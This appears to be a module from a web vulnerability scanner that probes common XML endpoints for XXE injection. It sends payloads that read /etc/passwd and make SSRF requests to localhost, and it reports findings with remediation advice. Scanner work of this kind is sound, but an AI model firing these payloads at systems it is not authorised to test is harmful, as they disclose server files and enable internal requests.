from modules.base import BaseModule


class XxeModule(BaseModule):
    NAME = "xxe"
    DESCRIPTION = "XXE injection testing - file read, SSRF via XML"

    XXE_PAYLOADS = [
        # Classic file
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root><name>&xxe;</name></root>',
            "file:///etc/passwd",
        ),
        # SSRF
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>'
            '<root><name>&xxe;</name></root>',
            "http://127.0.0.1/",
        ),
        # OOB / blind - placeholder
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/">%xxe;]>'
            '<root/>',
            "OOB",
        ),
    ]

    XML_ENDPOINTS = ["/xml", "/api/xml", "/upload", "/soap", "/api"]

    def run(self):
        self.log.info("[xxe] Testing for XXE vulnerabilities")
        headers = {"Content-Type": "application/xml"}
        for path in self.XML_ENDPOINTS:
            for payload, hint in self.XXE_PAYLOADS:
                resp = self.post(self.url(path), data=payload, headers=headers)
                if resp and not self.is_probable_not_found(resp) and \
                        ("root:" in resp.text or "daemon:" in resp.text):
                    self.add_finding(
                        severity="CRITICAL",
                        title="XML External Entity (XXE) Injection",
                        url=self.url(path),
                        detail=f"XXE payload disclosed server files ({hint}).",
                        payload=payload[:120],
                        evidence=resp.text[:300],
                        remediation=(
                            "Disable external entity processing in your XML parser. "
                            "Use a JSON API where possible."
                        ),
                    )
                    return
